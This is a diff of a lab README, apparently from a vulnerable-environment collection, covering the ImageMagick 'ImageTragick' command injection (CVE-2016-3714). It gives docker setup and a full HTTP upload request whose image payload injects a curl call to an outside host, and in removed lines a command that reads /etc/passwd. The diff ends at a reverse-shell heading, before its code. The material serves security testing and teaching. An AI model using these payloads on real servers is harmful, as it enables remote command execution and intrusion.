@@ -1,68 +1,56 @@
-# Imagetragick Command Execution Vulnerability (CVE-2016–3714)
+# Imagemagick Command Injection Vulnerability (CVE-2016–3714)
+
+ImageMagick is a free and open-source[3] cross-platform software suite for displaying, creating, converting, modifying, and editing raster images.
 
 [中文版本(Chinese version)](README.zh-cn.md)
 
 Referers:
 
-- https://imagetragick.com/
+- https://imagetragick.com
 - https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html
+- https://github.com/ImageTragick/PoCs
 
 ## Environment Setup
 
-Enter the following commands:
+Execute the following command to start a PHP server that includes Imagemagick 6.9.2-10:
 
 ```
-docker-compose build
 docker-compose up -d
 ```
 
-Visit `http://your-ip/` and you'll see three files:
+## Exploit
 
-```bash
-├── demo.php # use vul.jpg + identify command to test 
-├── upload.php # Support users to upload a file，deliver it to PHP's imagick extension, and then the vulnerability will be triggered
-└── vul.jpg # a simple POC
-```
+Visit `http://your-ip:8080/` to see an upload component.
 
-## POC
-
-Some POCs used: https://github.com/ImageTragick/PoCs
-
-You can take a test by visiting `http://your-ip/demo.php`. Even though the command executed (`cat /etc/passwd > /tmp/success`) doesn't have a specific character in the response, the `/tmp/success` file is successfully created in the docker container:
-
-![](1.png)
-
-Also you can visit `http://your-ip/upload.php` to test another POC. Upload the POC file and packets are as follows（**Attention: this is another POC**）：
+Send the following request:
 
 ```
-POST /upload.php HTTP/1.1
-Host: your-ip
-Content-Length: 321
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydGYwkOC91nnON1ws
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
+POST / HTTP/1.1
+Host: localhost:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
 Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymdcbmdQR1sDse9Et
+Content-Length: 328
 
-------WebKitFormBoundarydGYwkOC91nnON1ws
-Content-Disposition: form-data; name="file_upload"; filename="vul.gif"
-Content-Type: image/jpeg
+------WebKitFormBoundarymdcbmdQR1sDse9Et
+Content-Disposition: form-data; name="file_upload"; filename="1.gif"
+Content-Type: image/png
 
 push graphic-context
 viewbox 0 0 640 480
 fill 'url(https://127.0.0.0/oops.jpg"|curl "www.leavesongs.com:8889)'
 pop graphic-context
-------WebKitFormBoundarydGYwkOC91nnON1ws--
-
+------WebKitFormBoundarymdcbmdQR1sDse9Et--
 ```
 
-As shown, `www.leavesongs.com:8889` has received the http request, proving that the curl command is executed successfully：
+It can be seen that `www.leavesongs.com:8889` has received the http request, after the curl command was executed successfully:
 
 ![](2.png)
 
-POC of getting a shell：
+POC of getting a reverse shell：
 
 ```
 push graphic-context
